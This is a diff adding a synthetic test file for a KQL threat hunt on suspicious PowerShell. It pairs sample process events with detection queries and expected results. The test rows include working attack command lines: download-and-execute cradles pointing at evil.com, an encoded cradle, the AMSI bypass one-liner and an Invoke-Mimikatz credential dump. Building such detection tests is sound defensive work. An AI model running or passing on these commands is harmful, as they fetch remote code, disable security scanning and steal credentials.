@@ -1,0 +1,109 @@
+// ============================================================================
+// Hunt 02: Suspicious PowerShell - Synthetic Test Data
+// ============================================================================
+
+let TestDeviceProcessEvents = datatable(
+    Timestamp: datetime,
+    DeviceName: string,
+    FileName: string,
+    ProcessCommandLine: string,
+    ProcessId: int,
+    InitiatingProcessFileName: string,
+    InitiatingProcessCommandLine: string,
+    AccountName: string,
+    AccountDomain: string
+) [
+    // Test Case 1: Download Cradle (SHOULD DETECT - High)
+    datetime(2024-01-14 09:00:00), "WORKSTATION01", "powershell.exe",
+    "powershell.exe -ep bypass IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
+    1234, "cmd.exe", "cmd.exe", "user1", "CONTOSO",
+    
+    // Test Case 2: Encoded Command - Long (SHOULD DETECT - High)
+    datetime(2024-01-14 09:30:00), "WORKSTATION02", "powershell.exe",
+    "powershell.exe -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA",
+    2345, "explorer.exe", "explorer.exe", "user2", "CONTOSO",
+    
+    // Test Case 3: AMSI Bypass (SHOULD DETECT - Critical)
+    datetime(2024-01-14 10:00:00), "WORKSTATION03", "powershell.exe",
+    "powershell.exe [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+    3456, "cmd.exe", "cmd.exe", "attacker", "CONTOSO",
+    
+    // Test Case 4: Multiple Bypass Flags (SHOULD DETECT - High)
+    datetime(2024-01-14 10:30:00), "WORKSTATION04", "powershell.exe",
+    "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Get-Process\"",
+    4567, "wscript.exe", "wscript.exe malware.vbs", "user3", "CONTOSO",
+    
+    // Test Case 5: Credential Harvesting (SHOULD DETECT - Critical)
+    datetime(2024-01-14 11:00:00), "SERVER01", "powershell.exe",
+    "powershell.exe -c \"Invoke-Mimikatz -DumpCreds | Out-File C:\\temp\\creds.txt\"",
+    5678, "cmd.exe", "cmd.exe", "admin", "CONTOSO",
+    
+    // Test Case 6: Office Spawning PowerShell (SHOULD DETECT - High)
+    datetime(2024-01-14 11:30:00), "WORKSTATION05", "powershell.exe",
+    "powershell.exe -ep bypass -c \"Start-Process calc.exe\"",
+    6789, "winword.exe", "winword.exe /n malicious.docm", "user4", "CONTOSO",
+    
+    // Test Case 7: Invoke-WebRequest Download (SHOULD DETECT - High)
+    datetime(2024-01-14 12:00:00), "WORKSTATION06", "powershell.exe",
+    "powershell.exe Invoke-WebRequest -Uri http://evil.com/malware.exe -OutFile C:\\temp\\malware.exe; Start-Process C:\\temp\\malware.exe",
+    7890, "cmd.exe", "cmd.exe", "user5", "CONTOSO",
+    
+    // Test Case 8: Legitimate Admin Script (SHOULD NOT DETECT)
+    datetime(2024-01-14 12:30:00), "SERVER02", "powershell.exe",
+    "powershell.exe -File C:\\Scripts\\Get-ServerHealth.ps1",
+    8901, "services.exe", "services.exe", "SYSTEM", "NT AUTHORITY",
+    
+    // Test Case 9: SCCM Script (SHOULD NOT DETECT - False Positive)
+    datetime(2024-01-14 13:00:00), "WORKSTATION01", "powershell.exe",
+    "powershell.exe -ExecutionPolicy Bypass -File C:\\Windows\\CCM\\Scripts\\compliance.ps1",
+    9012, "ccmexec.exe", "ccmexec.exe", "SYSTEM", "NT AUTHORITY",
+    
+    // Test Case 10: Reflection Assembly Load (SHOULD DETECT - High)
+    datetime(2024-01-14 13:30:00), "WORKSTATION07", "powershell.exe",
+    "powershell.exe [System.Reflection.Assembly]::Load([Convert]::FromBase64String($payload))",
+    1011, "mshta.exe", "mshta.exe http://evil.com/payload.hta", "user6", "CONTOSO"
+];
+
+// ============================================================================
+// VALIDATION - Run detection patterns against test data
+// ============================================================================
+
+// Download Cradle Detection
+TestDeviceProcessEvents
+| where FileName =~ "powershell.exe"
+| where ProcessCommandLine has_any ("Net.WebClient", "DownloadString", "Invoke-WebRequest", "IWR")
+| where ProcessCommandLine has_any ("IEX", "Invoke-Expression", "Start-Process")
+| extend ExpectedDetection = true, DetectionType = "Download Cradle"
+| project Timestamp, DeviceName, DetectionType, ProcessCommandLine, ExpectedDetection;
+
+// Encoded Command Detection
+TestDeviceProcessEvents
+| where FileName =~ "powershell.exe"
+| where ProcessCommandLine has_any ("-enc", "-EncodedCommand")
+| extend 
+    EncodedPart = extract(@"-enc\s+([A-Za-z0-9+/=]{20,})", 1, ProcessCommandLine),
+    ExpectedDetection = true,
+    DetectionType = "Encoded Command"
+| where isnotempty(EncodedPart)
+| project Timestamp, DeviceName, DetectionType, strlen(EncodedPart), ExpectedDetection;
+
+// AMSI Bypass Detection
+TestDeviceProcessEvents
+| where FileName =~ "powershell.exe"
+| where ProcessCommandLine has_any ("AmsiUtils", "amsiInitFailed")
+| extend ExpectedDetection = true, DetectionType = "AMSI Bypass"
+| project Timestamp, DeviceName, DetectionType, ProcessCommandLine, ExpectedDetection;
+
+// ============================================================================
+// EXPECTED RESULTS SUMMARY
+// ============================================================================
+// Test Case 1: DETECT - Download Cradle
+// Test Case 2: DETECT - Encoded Command (High - long encoding)
+// Test Case 3: DETECT - AMSI Bypass (Critical)
+// Test Case 4: DETECT - Multiple Bypass Flags
+// Test Case 5: DETECT - Credential Harvesting (Critical)
+// Test Case 6: DETECT - Suspicious Parent (Office)
+// Test Case 7: DETECT - Download Cradle
+// Test Case 8: NO DETECT - Legitimate admin script
+// Test Case 9: NO DETECT - SCCM script (false positive)
+// Test Case 10: DETECT - Reflection Assembly Load
